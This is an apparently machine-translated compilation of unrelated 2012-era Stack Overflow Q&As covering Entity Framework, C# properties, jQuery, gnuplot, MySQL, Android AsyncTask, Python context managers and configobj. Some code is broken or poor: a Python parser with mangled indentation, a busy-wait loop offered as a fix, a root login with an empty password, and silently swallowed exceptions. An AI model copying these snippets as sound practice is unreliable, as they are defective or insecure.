> 默认情况下，一个新的 Meteor 应用程序包括 autopublish 和 insecure 包，它们共同模仿每个客户端对服务器数据库具有完全读/写访问权限的效果。这些是有用的原型设计工具，但通常不适合生产应用程序。准备好后，只需卸下包裹即可。

# asp.net-mvc - EntityFramework 中的 Linq 转换问题

> ID：14074773
> 
> 赞同：0
> 
> 时间：2012-12-28T19:38:10.720
> 
> 标签：asp.net-mvc, asp.net-mvc-3, linq, entity-framework

嗨，我是 Linq 和实体框架的新手。我正在做这样的事情，我有 3 个视图模型：

1.

```
public class FlowViewModel
{
   ..........................
    public List<FlowLevelViewModel> Levels { get; set; }
}

public class FlowLevelViewModel
{
    .........................
    public List<BlockDetailsViewmodel> Blocks { get; set; }
}
public class BlockDetailsViewmodel
{
    .......................
} 
```

并从我的控制器中调用数据层。

```
var model = new FlowViewModel();
        model = dataOb.GetFlowForTheDocument(company, docType);
        model = dataOb.GetFlowStageForTheDocument(model);
        return model; 
```

在我的数据层中

```
 public FlowViewModel GetFlowStageForTheDocument(FlowViewModel model)
    {
        var flowlevelviewModel = (from p in dbContext.FlowStages 
                             where p.FlowID == model.FlowId 
                             select new FlowLevelViewModel()
                              {
                               .................
                         Blocks = GetBlockDetailsForTheDocument(p.StageID, .StageType)
                              }).ToList();

        model.Levels = flowlevelviewModel;
        return model;
    }
    public List<BlockDetailsViewmodel> GetBlockDetailsForTheDocument(int StageID, string stageType)
    {
        var blockDetails = new List<BlockDetailsViewmodel>();
        ......................................
        return blockDetails;
    } 
```

当我运行程序时，我收到了这个错误：

```
**NotSupportedException Was unhandled by user Code**
    LINQ to Entities does not recognize the method 'System.Collections.Generic.List`1[SEADViewModel.BlockDetailsViewmodel] GetBlockDetailsForTheDocument(Int32, System.String)' method, and this method cannot be translated into a store expression. 
```

我的项目处于生产阶段，所以我根本没有时间。有谁知道我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:47:45.413

这应该可以解决您的问题：

```
var data = (from p in dbContext.FlowStages 
                             where p.FlowID == model.FlowId 
                             select p).ToList();
var flowlevelviewModel = (from p in data
                          select new FlowLevelViewModel()
                              {
                               .................
                         Blocks = GetBlockDetailsForTheDocument(p.StageID, .StageType)
                              }).ToList(); 
```

请注意，这将在第一次评估查询`ToList()`。如果您需要一次运行整个查询，则需要构建一个简单的 LINQ 表达式，您不能 `GetBlockDetailsForTheDocument`在查询中使用您的方法。有关支持的内置方法的链接，请参阅@Tilak 的答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:40:56.757

您正在使用[Linq to Entity](http://msdn.microsoft.com/en-us/library/bb386964.aspx)。

它不支持所有功能。[支持和不支持的功能列表](http://msdn.microsoft.com/en-us/library/bb738550.aspx)

您需要编写[自定义模型定义函数](http://msdn.microsoft.com/en-us/library/dd456857.aspx) `GetBlockDetailsForTheDocument`才能在 LINQ 查询中使用它。

# c# - 返回会员的好坏习惯

> ID：14074779
> 
> 赞同：0
> 
> 时间：2012-12-28T19:38:37.880
> 
> 标签：c#, variables, methods

我不确定这是否是无效的做法；或良好的做法。我不知所措的原因是我应该使用属性而不是局部变量吗？

我的推理和目标；是对本地磁盘驱动器的非常基本的检测。

我想指出一些事情：

*   我没有选择a `boolean value`，因为我希望能够调用这个类来返回驱动器路径。因此从方法中检索到的名称；能够`Path Combined`在某些派生类中。

我的例子：

```
 public class Drive
    {
        // Variable:
        public string nameOfDrive;

        public Drive()
        {
            // Call Method.
            DriveName();
        }

        public string DriveName()
        {
            DriveInfo [] drives = DriveInfo.GetDrives();
            foreach (DriveInfo d in drives)
            {
                // Verify Valid 'C:' is Present.
                if (d.Name == @"C:")
                {
                    // Set Name:
                    nameOfDrive = d.Name;
                    // Return Result.
                    return d.Name;
                }
            }
            // Exception:
            throw new Exception("Unable to locate the C: Drive... Please map the correct drive.");
        }

    }
    /*
     * The above method and class contains a verification
     * for the 'C:' Drive.  Once the items are validated;
     * it will create a return variable for the 'C:'.  
     * Otherwise it will throw an Exception.
    */ 
```

现在这是我不确定什么是更好的做法的地方。我应该使用属性而不是`public string nameOfDrive`. 还是我真的很遥远-这不是返回可在其他类中使用的值的最佳方法吗？还是直接引用成员变量是不好的做法？

第二个例子：

```
 public class Drive
    {
        private string nameOfDrive;
        public string NameOfDrive
        {
            get { return nameOfDrive; }
        }
        public Drive()
        {
            // Call Method.
            DriveName();
        }
        public string DriveName()
        {
            // Obtain Drive Information:
            DriveInfo [] drives = DriveInfo.GetDrives();
            foreach (DriveInfo d in drives)
            {
                // Verify Valid 'C:' is Present.
                if (d.Name == @"C:")
                {
                    // Set Name:
                    nameOfDrive = d.Name;
                    // Return Result.
                    return d.Name;
                }
            }
            // Exception:
            throw new Exception("Unable to locate the C: Drive... Please map the correct drive.");
        }
    }
    /*
     * The above method and class contains a verification
     * for the 'C:' Drive.  Once the items are validated;
     * it will create a return variable for the 'C:'.  
     * Otherwise it will throw an Exception.
    */ 
```

这样它就被标记为只读并确保它从方法中读取正确的值？

* * *

***更新：***

我很感激答案；但***为什么***它是更好的做法？

*   对安全有益吗？
*   更整洁？
*   更灵活

是什么使它成为更好的解决方案；这就是我试图理解的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-28T20:22:13.913

您可以使用`Lazy`该类来执行此操作。它专门用于解决延迟初始化可能需要一些时间来计算的值的确切问题。您可以为`Lazy`对象提供一个用于计算该值的方法，第一次请求该值时，它使用该函数生成该值，并且所有后续调用仅返回该第一个值。它还具有线程安全的优点（该函数只会被调用一次，无论有多少人在生成该值之前请求该值，并且他们都等到它被计算返回）。

```
public class Drive
{
    private Lazy<string> nameOfDrive = new Lazy<string>(DriveName);

    public string NameOfDrive
    {
        get { return nameOfDrive.Value; }
    }

    private static string DriveName()
    {
        DriveInfo[] drives = DriveInfo.GetDrives();

        foreach (DriveInfo d in drives)
        {
            if (d.Name == @"C:")
                return d.Name;
        }

        throw new Exception("Unable to locate the C: Drive... Please map the correct drive.");
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-28T19:44:16.210

我会使用带有私有成员变量的只读属性。这样，如果您在不破坏调用代码的情况下更改查找驱动器号的方式，更新类就更容易了。

为什么你的`DriveName`方法返回任何东西？它是公开使用还是仅用于填充您的`NameOfDrive`财产？如果仅在课堂内使用，我会将其设为私有且无效。

编辑：考虑一下，这似乎也是一种奇怪的方式，不仅可以检查驱动器的存在，还可以检查开头的字母。为什么要求用户的驱动器号是`C:`？用户设置机器的方式无关紧要。如果他们愿意，他们应该能够拥有他们的操作系统驱动器`Q:`，并且它不应该破坏您的代码。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-28T20:47:18.040

虽然，这不一定是坏习惯，但也不好。

在大多数情况下，当您有一个简单的数据类时应该使用字段（通常不涉及实际代码，只是一种存储一些值的方法）。如果您超出了该级别的复杂性，您通常应该让您的类使用属性。几个原因：

1.  稍后从字段转换为属性将破坏依赖关系并要求重新编译使用您的类的所有代码
2.  属性具有更细粒度的控制。快速浏览一下您的用例，您似乎应该有一个 getter，它会自动填充和缓存驱动器号，并使默认设置器私有，因此它是只读的
3.  属性可以是虚拟的。这意味着人们可以更容易地将您的课程扩展到您最初想象的之外。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T20:16:30.550

我会创建一个类（甚至是扩展）来提取 cdrive。让消费者根据他们的需要抛出错误。

通过创建一个通用方法，允许根据情况重用流程，并坚持使用面向对象的原则，将概念隔离为唯一的对象。

```
void Main()
{

  if (Drive.AcquireCDrive() == null)
      throw new Exception("Unable to locate the C: Drive... Please map the correct drive.");

}

public class Drive
{
    public static DriveInfo AcquireCDrive()
    {
       return DriveInfo.GetDrives()
                       .OfType<DriveInfo>()
                       .Where (drive => drive.IsReady)
                       .FirstOrDefault( drive => drive.Name.Contains(@"C:"));
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-28T19:54:02.060

可能更好的做法是使用只读属性，但延迟加载它。

注意下面，我将`DriveName()`方法设为私有，并且没有`DriveName()`在构造函数中调用该方法。

```
public class Drive
{
    private string nameOfDrive = null;

    public string NameOfDrive
    {
        get 
        {
            if (nameOfDrive == null)
                nameOfDrive = DriveName();
            return nameOfDrive; 
        }
    }

    public Drive()
    {    }

    private string DriveName()
    {
        DriveInfo[] drives = DriveInfo.GetDrives();

        foreach (DriveInfo d in drives)
        {
            if (d.Name == @"C:")            
                return d.Name;
        }

        throw new Exception("Unable to locate the C: Drive... Please map the correct drive.");
    }
} 
```

# jquery - 用一个 jquery 更新一页中的多个 div

> ID：14074787
> 
> 赞同：0
> 
> 时间：2012-12-28T19:39:05.740
> 
> 标签：jquery, ajax, html

我正在寻找一种使下面的代码通用的方法。我的目标是用一个脚本在一个页面上更新多个 div（因为我将有大约 100 个）。使用下面的结构，每个 DIV 必须有一个脚本。我来自 webservice_getall.asp 的返回字符串可以根据解析的参数返回值（它们看起来像这样：K2、C16、B2 等任何帮助表示赞赏。

我当前的代码如下所示：

```
<body>

<div id='content1'>Loading...</div> 
<div id='content2'>Loading...</div> 
<div id='content3'>Loading...</div> 
<div id='content4'>Loading...</div> 
 ......
<div id='contentN'>Loading...</div> 
</body>

</html>
<script type="text/javascript" src="jquery-1.7.2.js"></script>
<script>
(function($)
{
    $(document).ready(function()
    {
        $.ajaxSetup(
        {
            cache: false,
            beforeSend: function() {
                $('#content').show();

            },
            complete: function() {

                $('#content').show();
            },
            success: function() {

                $('#content').show();
            }
        });

        var $container = $("#content");
        $container.load("webservice_getall.asp?request=contentN");
        var refreshId = setInterval(function()
        {
            $container.load('webservice_getall.asp?request=contentN');
        }, 1000);
    });
})(jQuery);
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-10T03:49:54.920

> 现在，有了我拥有的“内容”，我只从字符串中的一个值上得到了完整的字符串。

在这种情况下，这将在一定程度上取决于您的退货格式。我将假设您只是返回一个以逗号分隔的文本字符串。如果您收到 JSON 返回或其他任何内容，则需要对其进行修改以适应。

首先，您需要将返回值转换为数组。使用javascript的[`string.split`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/split)方法很容易。
**注意**：您没有很好地描述您的内容。此方法假定您的示例内容具有代表性，并且其中永远不会有包含逗号的内容块*：*也就是说，逗号**只会**用于分隔内容元素。就个人而言，我通常会对所有内容进行 json 编码并使用它，但这就是我。

一旦你有了一个数组，你可以使用适当的选择器和[`.each()`](http://api.jquery.com/each/)方法来遍历你的 div 并将数组中的相应字段放入每个 div。

**注意：**我选择了一种天真的方法，假设您将始终从`id=content1`页面开始......或者如果您不这样做，您将始终在数组中返回适当的起始值，无论您的起始内容是什么（因为在调用您的服务器时包含我们的起始索引 no 是微不足道的，然后从该起始点返回正确数量的元素）。

此时，您的代码将如下所示：

**TODO**替换为您用来一次调用所有内容的任何查询字符串。您还没有说得很清楚，因为您问题中的示例显然是您的旧代码。`"webservice_getall.asp?request=**allcontent**"``get`

```
<body>

<div id='content1'>Loading...</div> 
<div id='content2'>Loading...</div> 
<div id='content3'>Loading...</div> 
<div id='content4'>Loading...</div> 
 ......
<div id='contentN'>Loading...</div> 
</body>

<script type="text/javascript" src="jquery-1.7.2.js"></script>
<script>
(function($) {
  $(document).ready(function() {
    $.ajaxSetup( {
      cache: false,
      beforeSend: function() {
        $('#content').show();
      }, 
      complete: function() {
        $('#content').show();
      }, 
      success: function() {
        $('#content').show();
      }
    });
    $.get("webservice_getall.asp?request=allcontent", function(contentReturn){
      contentReturn = contentReturn.split(',');

      $('div[id^="content"]').each(function (index) {
        $(this).html(contentReturn[index]);
      });
    });
    var refreshId = setInterval(function() {
      $.get("webservice_getall.asp?request=allcontent", function(contentReturn) {
        contentReturn = contentReturn.split(',');

        $('div[id^="content"]').each(function (index) {
          $(this).html(contentReturn[index]);
        });
      });
      },
      1000);
  });
})(jQuery);
</script>
</html> 
```

这[是 jsfiddle 中的一个示例](http://jsfiddle.net/H33UC/14/)（显然不使用 AJAX，但它是该原理的工作演示）。

因为这种方式只使用单个选择器迭代每个 div 元素一次，所以它应该是相当不错的性能（例如，与迭代数组并为每个数组元素使用一个新的选择器来处理每个 div 不同——而不是没有'如果你想迭代数组而不是更好的方法，就像不做什么的例子一样）。需要注意的是，我不知道它将如何在真正的大页面上执行，尤其是整个页面取决于单个 AJAX 调用。

我也不知道你为什么反复打电话`show`，`#content`但我没有理会它。我假设你知道你在用它做什么，并会采取相应的行动。由于您在新的 WIP 解决方案上展示的细节很少，我只是调整了您提供的内容。希望它能告诉你去哪里，我不能保证它会像你提供的细节一样工作。

# linux - 使用 Linux 实时绘制一串 CSV 数据

> ID：14074790
> 
> 赞同：1
> 
> 时间：2012-12-28T19:39:19.037
> 
> 标签：linux, plot, real-time, gnuplot, graphite

我有一个文本文件，它会不断更新传感器数据。这是一个示例：

```
12/28/2012 09:18:11,09:17:12,277.016541,273.457367,2324.178467,0.000000,0.571761,6.648867,6.648867,3.371597,3.371597,0.000000,0.007276,-0.001178,-0.195191,-0.003888,-1.484903,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,288.040405,0.000000,12.074584,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,12.074584,288.040405,1137.196655,0.000000,0.000000 
```

我正在尝试生成一些图，以便更好地查看我的数据的样子。文本文件每 15 秒左右更新一次新数据。我想创建一个包含所有数据的图。时间是X轴。然后，我想用单个传感器数据创建一个图。我真的很喜欢 Graphite，但它不理解我的数据流。我正在玩 gnuplot，但似乎无法使用我的数据文件来绘制它。

那里有任何指示吗？

# c# - c 从函数中锐化返回对象

> ID：14074794
> 
> 赞同：1
> 
> 时间：2012-12-28T19:39:25.290
> 
> 标签：c#, mysql, database

我面临一个问题，当我创建自己的类时，我想创建 Mysql 连接函数并且我想在我的所有表单中使用它我这样做

程序.cs

```
using MySql.Data.MySqlClient;
using MySql.Data.Types;
using System.Xml;
using System.IO;
public class testing
    {
        public string fahadt="Hello Class";

        public  void conncting()
        {

            MySqlConnection connection;
            string cs = @"server=localhost;userid=root;password=;database=taxi";
            connection = new MySqlConnection(cs);
            try
            {

                connection.Open();

            }
            catch (MySqlException ex)
            {
               // MessageBox.Show(ex.ToString());
            }

        }

    } 
```

并以我的形式

```
private void button7_Click(object sender, EventArgs e)
        {
            testing fahad = new testing();
            try
            {
                dataGridView1.Show();
                fahad.conncting();

                // here is error under fahad.conncting.createcommand();
                MySqlCommand cmd = fahad.conncting.CreateCommand();
                //cmd.CommandText = "SELECT * FROM  ocms_visitors WHERE `id`='"+textBox4.Text+"'";
               // MySqlDataAdapter adap = new MySqlDataAdapter(cmd);
                //textBox4.Text = adap.id;

               // DataSet ds = new DataSet();
               // adap.Fill(ds);

               // dataGridView1.DataSource = ds.Tables[0].DefaultView;
                //MessageBox.Show("Yes Mysql Connection is Working Now  !");
            }
            catch (Exception)
            {
                throw;
            }

        } 
```

我不知道我该怎么做我很新= C#

请帮助我，我还有另一个 q 我应该在课堂和形式中使用 .... 还是在课堂上足够了？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:54:53.113

你需要返回`MySqlConnection`

将您的功能修改为：

```
 public  MySqlConnection conncting()
    {

        MySqlConnection connection;
        string cs = @"server=localhost;userid=root;password=;database=taxi";
        connection = new MySqlConnection(cs);
        try
        {

            connection.Open();
            return connection;

        }
        catch (MySqlException ex)
        {
            return null;
           // MessageBox.Show(ex.ToString());
        }

    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:48:05.527

要回答您最初的问题，在我看来您已经创建了您正在寻找的连接。接下来的步骤是了解 SqlCommand 类。

如需参考/启发，请尝试此[链接](http://www.csharp-station.com/Tutorial/AdoDotNet)，并祝您编码愉快！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T20:01:19.180

我怀疑你想从你的`conncting()`方法返回一个连接？

```
 public MySqlConnection conncting()
    {
        string cs = @"server=localhost;userid=root;password=;database=taxi";
        MySqlConnection connection = new MySqlConnection(cs);
        connection.Open();
        return connection;
    } 
```

要回答您的第二个问题，是的，尽可能`using {..}`对实例使用块是一个好主意。`IDisposable`这包括连接、命令、数据适配器等。以下可能是一个合理的模式：

```
 using (MySqlConnection conn = fahad.conncting())
    using (MySqlCommand cmd = new MySqlCommand("select * from table", conn))
    using (MySqlDataAdapter da = new MySqlDataAdapter(cmd))
    using (DataTable dt = new DataTable())
    {
        da.Fill(dt);
        // do something with datatable
    } 
```

# java - android使用asynctask解析json

> ID：14074795
> 
> 赞同：2
> 
> 时间：2012-12-28T19:39:25.497
> 
> 标签：java, android, android-asynctask

我正在开发 android 应用程序，我需要用数据解析我的 json 对象。您如何看到我创建了 JSONParser 类并尝试使用 asynctask 但出现了问题，我不明白问题出在哪里。每次我使用它时，resultJSON 都是空的。希望您能给我一个建议！

```
public class JSONParser {
    private String resultJSON;

public JSONArray getJSON(String url) throws JSONException {
    Parser parser = new Parser();
    parser.execute(url);
    return json;
}

private class Parser extends AsyncTask<String, Void, String> {
    @Override
    protected String doInBackground(String... urls) {
        for (String url : urls) {
            StringBuilder builder = new StringBuilder();
            HttpClient client = new DefaultHttpClient();
            HttpGet httpGet = new HttpGet(url);
            try {
                HttpResponse response = client.execute(httpGet);
                StatusLine statusLine = response.getStatusLine();
                int statusCode = statusLine.getStatusCode();
                if (statusCode == 200) {
                    HttpEntity entity = response.getEntity();
                    InputStream content = entity.getContent();
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(content));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        builder.append(line);
                    }
                    resultJSON = builder.toString();
                } else {
                    Log.e(JSONParser.class.toString(), "Failed to download file");
                }
            } catch (ClientProtocolException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
      }
      return resultJSON;
    }
    @Override
    protected void onPostExecute(String result) {
        super.onPostExecute(result);
        try {
            json = new JSONArray(result);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:56:54.847

为什么不在`JSONArray json = new JSONArray(resultJSON);`async task 的 post execute 方法上执行此操作。

而且我不会建议 varevarao 方式，因为它会增加一个线程的负担。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-29T14:56:44.347

问题已解决。这是一个糟糕的解决方法，但它有效。添加这一行

```
while(json==null) {} 
```

调用execute方法后。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-28T19:50:45.027

您应该使用 AsyncTask 类的[get() 方法](http://developer.android.com/reference/android/os/AsyncTask.html#get%28%29)来检索任务的结果。它等待任务完成并获得结果（这意味着最好将它包含在带有进度对话框的单独线程中，或者只是一个后台线程）。

```
public JSONArray getJSON(String url) throws JSONException {
    Parser parser = new Parser();
    parser.execute(url);
    resultJSON = parser.get(); // Probably put this in a Thread to avoid spending too much time waiting for a result on the main thread
    JSONArray json = new JSONArray(resultJSON);
    return json;
} 
```

# python - Python yield 在 try 块中没有参数

> ID：14074796
> 
> 赞同：4
> 
> 时间：2012-12-28T19:39:27.820
> 
> 标签：python

我正在阅读[这篇](http://dietbuddha.blogspot.com/2012/12/52python-encapsulating-exceptions-with.html)文章，它显示了这段有趣的代码：

```
class Car(object):
   def _factory_error_handler(self):
      try:
         yield
      except FactoryColorError, err:
         stacktrace = sys.exc_info()[2]
         raise ValidationError(err.message), None, stacktrace

   def _create_customizer_error_handler(self, vin):
      try:
         yield
      except CustomizerError, err:
         self._factory.remove_car(vin)
         stacktrace = sys.exc_info()[2]
         raise ValidationError(err.message), None, stacktrace

   def _update_customizer_error_handler(self, vin):
      try:
         yield
      except CustomizerError, err:
         stacktrace = sys.exc_info()[2]
         raise ValidationError(err.message), None, stacktrace

   def create(self, color, stereo):
      with self._factory_error_handler():
         vin = self._factory.make_car(color)

      with self._create_customizer_error_handler(vin):
         self._customizer.update_car(vin, stereo)

      return vin

   def update(self, vin, color, stereo):
      with self._factory_error_handler():
         self._factory.update_car_color(vin, color)

      with self._update_customizer_error_handler(vin):
         self._customizer.update_car(vin, stereo)

      return 
```

`try`在这里，他们在一个块中没有参数就让步了。`with`然后在一个块内使用它。有人可以解释一下这里发生了什么吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-28T19:54:06.000

帖子中的代码似乎是错误的。如果各种错误处理程序都用`contextmanager`. 请注意，在帖子中，代码导入`contextmanager`但不使用它。这让我觉得这个人只是在创建帖子时犯了一个错误，而`contextmanager`没有提到那个例子。（帖子后面的例子*确实*使用了`contextmanager`。）我认为发布的代码会导致一个`AttributeError`，因为各种`_error_handler`函数不是上下文管理器并且没有权限`__enter__`和`__exit__`方法。

使用，代码基于[文档](http://docs.python.org/2/library/contextlib.html#contextlib.contextmanager)`contextmanager`是有意义的：

> 在生成器产生的地方，嵌套在 with 语句中的块被执行。然后在退出块后恢复生成器。如果块中发生未处理的异常，它会在生成器中在产生产生的点重新引发。

# objective-c - iOS 中的 RTSP 流

> ID：14074802
> 
> 赞同：1
> 
> 时间：2012-12-28T19:39:49.177
> 
> 标签：objective-c, ios, ffmpeg, rtsp, live555

我是新手`Objective-C`。如何`RTSP`在应用程序中读取流`iOS`？

显然图书馆`live555`和`ffmpeg`能力，但我发现没有这么简单和实用。

还有其他解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T19:28:33.590

所有解决方案都使用 ffmpeg。

但是有些比其他更容易，这里有一个教程可以帮助您入门。

[http://sol3.typepad.com/exotic_particles/](http://sol3.typepad.com/exotic_particles/)

我个人发现 live 555 提供了最多的选择，但也很难上手。大多数困难通常在于构建 ffmpeg 库。

# trigger.io - trigger.io 条码扫描模块可以和 RedLaser 一起使用吗

> ID：14074804
> 
> 赞同：2
> 
> 时间：2012-12-28T19:40:02.050
> 
> 标签：trigger.io

我们真的很喜欢 Redlaser API。是否可以将触发器的条形码模块与 Redlaser 集成？

# python - 使 python configobj 在 '=' 前后不加空格

> ID：14074805
> 
> 赞同：2
> 
> 时间：2012-12-28T19:40:03.950
> 
> 标签：python, configobj

简单的问题。是否可以使 configobj 在配置条目中的“=”前后不放置空格？

我正在使用 configobj 来读取和写入稍后由 bash 脚本处理的文件，因此放置一个类似的antry：

变量 = “价值”

破坏 bash 脚本，它必须始终是：

变量="值"

或者，如果有人对如何使用这种条目（和限制）读写文件有其他建议也可以。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-10-01T13:48:05.813

我正在通过更改第 1980 行来查看相同并修改过的**configobj.py ：**

```
def _write_line(self, indent_string, entry, this_entry, comment) 
```

从：

```
self._a_to_u(' = ') 
```

到：

```
self._a_to_u('=') 
```

更改后的输出没有等号前后的空格。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T20:27:37.037

Configobj 用于读取和写入 ini 样式的配置文件。您显然正在尝试使用它来编写 bash 脚本。这不太可能奏效。

只需像您希望的那样编写 bash 脚本，也许使用模板或其他东西。

要使 ConfigParses 不写周围的空格，`=`可能需要您对其进行子类化。我猜你必须修改 write 方法，但只有阅读代码才能提供帮助。:-)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T08:11:46.207

好吧，正如建议的那样，我最终为此编写了自己的解析器，它的使用方式与 ConfigObj 完全相同：

```
config = MyConfigParser("configuration_file")
print config["CONFIG_OPTION_1"]  
config["CONFIG_OPTION_1"]= "Value 1"
print config["CONFIG_OPTION_1
config.write() 
```

如果有人感兴趣或想提供建议，这是代码（不久前我开始用 python 编码，所以可能有很大的改进空间）。它尊重文件中选项的注释和顺序，并在需要时正确地转义并添加双引号：

```
import os
import sys

class MyConfigParser:
  name = 'MyConfigParser'
  debug = False
  fileName = None
  fileContents = None
  configOptions = dict()  

  def __init__(self, fileName, debug=False):
    self.fileName = fileName
    self.debug = debug    
    self._open()

  def _open(self):       
    try:
        with open(self.fileName, 'r') as file:
    for line in file:
      #If it isn't a comment get the variable and value and put it on a dict
      if not line.startswith("#") and len(line) > 1:
    (key, val) = line.rstrip('\n').split('=')
    val = val.strip()
    val = val.strip('\"')
    val = val.strip('\'')
    self.configOptions[key.strip()] = val
except:
  print "ERROR: File "  + self.fileName + " Not Found\n"

  def write(self):
try:
  #Write the file contents
  with open(self.fileName, 'r+') as file:
    lines = file.readlines()
    #Truncate file so we don't need to close it and open it again 
    #for writing
    file.seek(0)
    file.truncate()      

    i = 0
    #Loop through the file to change with new values in dict      
    for line in lines:    
      if not line.startswith("#") and len(line) > 1:
    (key, val) = line.rstrip('\n').split('=')
    try:
      if key in line:
        newVal = self.configOptions[key]
        #Only update if the variable value has changed
        if val != newVal:
          newLine = key + "=\"" + newVal + "\"\n"
          line = newLine
    except:
      continue
      i +=1
      file.write(line)
except IOError as e:
  print "ERROR opening file " + self.fileName + ": " + e.strerror + "\n"

  #Redefinition of __getitem__ and __setitem__

  def __getitem__(self, key):  
try:
  return self.configOptions.__getitem__(key)
except KeyError as e:
  if isinstance(key,int):
    keys = self.configOptions.keys()
    return self.configOptions[keys[key]]
  else:
    raise KeyError("Key " +key+ " doesn't exist")

  def __setitem__(self,key,value):
self.configOptions[key] = value 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-10-24T00:46:06.157

如上所述，可以通过对 _write_line 方法进行小的更改来删除等号两侧的空格。这可以通过继承 ConfigObj 并覆盖 _write_line 来方便地完成，如下所示 -

```
from configobj import ConfigObj

class MyConfigObj(ConfigObj):

    def __init__(self, *args, **kwargs):
        ConfigObj.__init__(self, *args, **kwargs)

    def _write_line(self, indent_string, entry, this_entry, comment):
        """Write an individual line, for the write method"""
            # NOTE: the calls to self._quote here handles non-StringType values.
        if not self.unrepr:
            val = self._decode_element(self._quote(this_entry))
        else:
            val = repr(this_entry)

        return '%s%s%s%s%s' % (indent_string,
                           self._decode_element(self._quote(entry, multiline=False)),
                           self._a_to_u('='),
                           val,
                           self._decode_element(comment)) 
```

然后只需使用 MyConfigObj 代替 ConfigObj 并维护 ConfigObj 的所有功能

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-28T20:31:37.850

正如 Lennart 建议的那样，configobj 可能不是适合这项工作的工具：怎么样：

```
>>> import pipes
>>> def dict2bash(d):
...     for k, v in d.iteritems():
...         print "%s=%s" % (k, pipes.quote(v))
...         
>>> dict2bash({'foo': "bar baz quux"})
foo='bar baz quux' 
```

由于 configobj 返回的东西看起来很像 dict，您可能仍然可以使用它来*读取*您尝试处理的数据。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-03-27T11:35:01.157

首先，感谢胡安乔。这就是我一直在寻找的。但我稍微编辑了 ConfigParser。现在它可以处理以下形式的 bash 脚本数组：

```
# Network interfaces to be configured
ifaces=( "eth0" "eth1" "eth2" "eth3" ) 
```

如果你设置一个值，它只是证明一个值是否是一个列表，如果它正确设置了引号。所以你可以用同样的方式设置值，即使它是一个列表：

```
ifaces = ['eth0', 'eth1', 'eth2', 'eth3']
conf['ifaces'] = ifaces 
```

这是代码：

```
import os
import sys

class MyConfigParser:
    name = 'MyConfigParser'
    debug = False
    fileName = None
    fileContents = None
    configOptions = dict()  
    qouteOptions = dict()

    def __init__(self, fileName, debug=False):
        self.fileName = fileName
        self.debug = debug    
        self._open()

    def _open(self):       
        try:
            with open(self.fileName, 'r') as file:
                for line in file:
                    #If it isn't a comment get the variable and value and put it on a dict
                    if not line.startswith("#") and len(line) > 1:
                        (key, val) = line.rstrip('\n').split('=')
                        val = val.strip()
                        val = val.strip('\"')
                        val = val.strip('\'')
                        self.configOptions[key.strip()] = val
                        if val.startswith("("):
                            self.qouteOptions[key.strip()] = ''
                        else:
                            self.qouteOptions[key.strip()] = '\"'
        except:
            print "ERROR: File "  + self.fileName + " Not Found\n"

    def write(self):
        try:
            #Write the file contents
            with open(self.fileName, 'r+') as file:
                lines = file.readlines()
                #Truncate file so we don't need to close it and open it again 
                #for writing
                file.seek(0)
                file.truncate()      

                #Loop through the file to change with new values in dict      
                for line in lines:
                    if not line.startswith("#") and len(line) > 1:
                        (key, val) = line.rstrip('\n').split('=')
                        try:
                            if key in line:
                                quotes = self.qouteOptions[key]

                                newVal = quotes +  self.configOptions[key] + quotes

                                #Only update if the variable value has changed
                                if val != newVal:
                                    newLine = key + "=" + newVal + "\n"
                                    line = newLine
                        except:
                            continue
                    file.write(line)
        except IOError as e:
                print "ERROR opening file " + self.fileName + ": " + e.strerror + "\n"

    #Redefinition of __getitem__ and __setitem__

    def __getitem__(self, key):  
        try:
            return self.configOptions.__getitem__(key)
        except KeyError as e:
            if isinstance(key,int):
                keys = self.configOptions.keys()
                return self.configOptions[keys[key]]
            else:
                raise KeyError("Key " + key + " doesn't exist")

    def __setitem__(self, key, value):
        if isinstance(value, list):
            self.qouteOptions[key] = ''
            value_list = '('
            for item in value:
                value_list += ' \"' + item + '\"'
            value_list += ' )'
            self.configOptions[key] = value_list
        else:
            self.qouteOptions[key] = '\"'
            self.configOptions[key] = value 
```

# uiimageview - 访问一个 UIImage 实例变量并在 UIImageView 中显示它

> ID：14074806
> 
> 赞同：0
> 
> 时间：2012-12-28T19:40:06.820
> 
> 标签：uiimageview, uiimage, nsbundle, ivar

我正在尝试访问 UIImage 实例变量并将其显示在 UIImageView 中。当我尝试 NSLog 路径时，我得到空值。我可以通过 IB 手动显示图片，但我想通过代码严格执行此操作

```
#import "Deck.h"
#import "Card.h"

